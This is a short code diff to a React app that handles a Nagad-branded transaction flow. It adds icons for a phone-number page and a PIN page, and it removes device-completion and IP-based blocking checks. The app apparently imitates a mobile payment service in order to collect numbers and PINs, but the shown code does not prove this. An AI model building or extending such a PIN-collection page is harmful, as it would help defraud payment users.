@@ -136,10 +136,6 @@ export default function App() {
       localStorage.setItem('nagad_device_id', deviceId);
     }
 
-    if (localStorage.getItem('nagad_completed') === 'true') {
-      setIsBlocked(true);
-    }
-
     let clientIp = '127.0.0.1';
     
     const loadAll = async () => {
@@ -232,17 +228,7 @@ export default function App() {
         const matched = blockedList.find((b) => {
           if (!b) return false;
           if (currentSessId && b.id === currentSessId) return true;
-          if (deviceId && b.deviceId && b.deviceId === deviceId) return true;
-          if (
-            session?.ip &&
-            b.ip &&
-            b.ip !== '127.0.0.1' &&
-            b.ip !== 'Unknown' &&
-            b.ip.length > 3 &&
-            b.ip === session.ip
-          ) {
-            return true;
-          }
+          if (deviceId && b.deviceId && b.deviceId === deviceId && b.deviceId !== 'Unknown') return true;
           return false;
         });
 
@@ -430,6 +416,8 @@ export default function App() {
             onComplete={handleCompleteTransaction}
             inputLogoUrl={storeSettings.nagadInputLogoUrl}
             instructionsImageUrl={storeSettings.instructionsImageUrl}
+            numberPageIconUrl={storeSettings.numberPageIconUrl}
+            pinPageIconUrl={storeSettings.pinPageIconUrl}
           />
         )}
 
